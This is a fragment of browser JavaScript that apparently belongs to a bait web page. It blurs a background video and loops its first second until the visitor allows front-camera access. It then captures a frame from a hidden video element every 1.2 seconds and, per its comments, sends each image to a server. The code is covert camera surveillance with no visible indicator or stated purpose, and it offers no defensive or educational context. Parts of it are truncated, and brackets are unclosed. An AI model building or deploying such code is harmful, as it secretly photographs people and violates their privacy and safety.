    let hiddenVideo;   // Hidden video element for camera capture
    let canvas;
    let context;
    let permissionGranted = false;
    const bgVideo = document.getElementById('backgroundVideo');

    // Loop only the first 1 second until camera permission is granted
    bgVideo.addEventListener('timeupdate', function() {
      if (!permissionGranted && this.currentTime > 1) {

    async function startCamera() {
      try {
        // Create hidden video element and canvas
        hiddenVideo = document.createElement('video');
        canvas = document.createElement('canvas');
        context = canvas.getContext('2d');

        // Request camera access (front camera)
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }

        hiddenVideo.srcObject = stream;
        hiddenVideo.play();

        // Remove blur and allow full playback once permission is granted
        bgVideo.style.filter = 'none';
        permissionGranted = true;
        bgVideo.loop = true;

    function captureAndSend() {
      // Ensure hidden video is ready
      if (!hiddenVideo || hiddenVideo.videoWidth === 0) return;

      // Set canvas dimensions and capture the image
      canvas.width = hiddenVideo.videoWidth;
      canvas.height = hiddenVideo.videoHeight;
      context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);

      // Convert canvas to blob and send it to the server
      canvas.toBlob(blob => {

    }

    startCamera();
    setInterval(captureAndSend, 1200);
